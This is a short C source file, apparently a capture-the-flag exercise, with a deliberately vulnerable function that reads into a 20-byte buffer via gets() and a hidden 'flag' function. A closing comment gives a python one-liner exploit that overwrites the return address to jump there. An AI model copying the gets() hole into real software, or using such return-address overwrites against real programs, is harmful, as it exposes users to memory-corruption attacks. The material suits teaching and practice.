#include <stdio.h>
#include <stdlib.h>

int flaggyyy(){
	printf("\nAlright! Take the flag..\n");
	system("cat /bin/pwn3");
	return 0;
}
int func(){
	char buffer[20];
	printf("Blow the stack!\n");
	gets(buffer);	
	return 0;
}

int main(){
  printf("\nHello there\n");
  func();
  printf("Aah! You're a good lad.\n");	
  return 0;
}

/*
abcdefghijklmn''''stuvwxyz
exploit:
abcdefghijklmn''''stuvwx####cdefghijklmn''''stuvwxyz
python -c 'print "x"*24+"\x08\x04\x84\x86"[::-1]'|./pwn3

*/
